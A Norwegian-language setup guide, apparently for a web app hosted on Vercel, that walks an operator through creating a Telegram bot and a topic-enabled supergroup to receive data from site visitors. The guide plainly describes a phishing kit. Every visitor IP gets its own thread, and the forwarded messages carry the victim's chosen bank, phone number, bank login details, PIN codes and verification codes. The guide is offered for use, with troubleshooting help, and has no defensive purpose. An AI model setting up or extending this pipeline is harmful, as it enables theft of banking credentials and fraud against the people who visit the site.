# Telegram Setup Guide

## Hvordan sette opp Telegram-integrasjonen

### 1. Opprett en Telegram Bot

1. Åpne Telegram og søk etter **@BotFather**
2. Send kommandoen `/newbot`
3. Følg instruksjonene for å gi botten et navn og et brukernavn
4. BotFather vil gi deg en **Bot Token** (ser ut som: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)
5. **Kopier og lagre denne tokenen** - du trenger den senere

### 2. Opprett en supergruppe med topics (OBLIGATORISK)

**VIKTIG**: For at hver IP-adresse skal få sin egen separate chat, må du bruke en **supergruppe med topics aktivert**.

1. Opprett en ny gruppe i Telegram
2. Gjør gruppen om til en **supergruppe**:
   - Gå til gruppeinnstillinger
   - Velg "Convert to Supergroup" (hvis tilgjengelig)
   - Eller opprett en ny supergruppe direkte
3. **Aktiver topics/forum-funksjonen**:
   - Gå til gruppeinnstillinger
   - Velg "Topics" eller "Forum"
   - Aktiver topics/forum-funksjonen
4. Legg til botten din som **administrator** i supergruppen
5. Gi botten rettigheter til å:
   - Sende meldinger
   - Administrere topics (hvis mulig)
6. Send en melding i supergruppen
7. Gå til: `https://api.telegram.org/bot<DIN_BOT_TOKEN>/getUpdates`
8. Finn `chat.id` i responsen (det vil være et negativt tall, f.eks. `-1001234567890`)

**Alternativ**: Hvis du ikke kan bruke topics, vil alle meldinger sendes til hovedkanalen/gruppen, men hver IP-adresse vil fortsatt være tydelig markert.

### 3. Sett miljøvariabler i Vercel

1. Gå til ditt Vercel-prosjekt
2. Gå til **Settings** → **Environment Variables**
3. Legg til følgende variabler:

   - **`TELEGRAM_BOT_TOKEN`**: Bot token du fikk fra BotFather
   - **`TELEGRAM_CHAT_ID`**: Chat ID du fant i steg 2 (f.eks. `-1001234567890`)

4. **Viktig**: Sørg for at variablene er satt for både **Production**, **Preview** og **Development** hvis du vil teste lokalt

### 4. Redeploy appen

Etter at du har lagt til miljøvariablene, må du redeploy appen i Vercel for at endringene skal tre i kraft.

## Hvordan det fungerer

- **Hver IP-adresse får sin egen separate chat (topic)** i supergruppen din
- Når en ny IP-adresse besøker nettsiden din:
  - Et nytt topic opprettes automatisk med navnet "IP: [IP-adresse]"
  - Alle påfølgende aktiviteter fra samme IP sendes til dette topicet
  - Du får full kontroll og oversikt over hver bruker i sin egen tråd

- Hver melding inneholder:
  - Hvilken handling brukeren utførte (bank valgt, telefon oppgitt, osv.)
  - Banknavn
  - Telefonnummer (hvis oppgitt)
  - Bank login-detaljer (hvis oppgitt)
  - PIN-koder og verifiseringskoder
  - IP-adresse
  - Tidsstempel

- **Fordeler med topics**:
  - Hver IP-adresse har sin egen isolerte chat
  - Enkel organisering og oversikt
  - Du kan enkelt se alle aktiviteter fra samme bruker samlet
  - Lettere å følge opp spesifikke brukere

## Feilsøking

### Får du feilmeldinger?

1. **"TELEGRAM_BOT_TOKEN eller TELEGRAM_CHAT_ID er ikke satt"**
   - Sjekk at du har lagt til miljøvariablene i Vercel
   - Sjekk at du har redeployet appen etter å ha lagt til variablene

2. **"Telegram API error: Unauthorized"**
   - Sjekk at Bot Token er riktig
   - Sjekk at botten ikke er deaktivert

3. **"Telegram API error: Bad Request: chat not found"**
   - Sjekk at Chat ID er riktig
   - Sjekk at botten er lagt til som administrator i kanalen/gruppen

4. **"Topics ikke støttet" eller "Kunne ikke opprette topic"**
   - Sjekk at gruppen er en **supergruppe** (ikke bare en vanlig gruppe)
   - Sjekk at **topics/forum-funksjonen er aktivert** i gruppeinnstillingene
   - Sjekk at botten har administrator-rettigheter
   - Hvis topics ikke fungerer, vil meldingene fortsatt sendes til hovedkanalen, men uten separate topics

5. **Ingen meldinger kommer**
   - Sjekk Vercel-loggene for feilmeldinger
   - Test at botten fungerer ved å sende en melding direkte til botten i Telegram
   - Sjekk at botten er lagt til i supergruppen og har sendere rettigheter
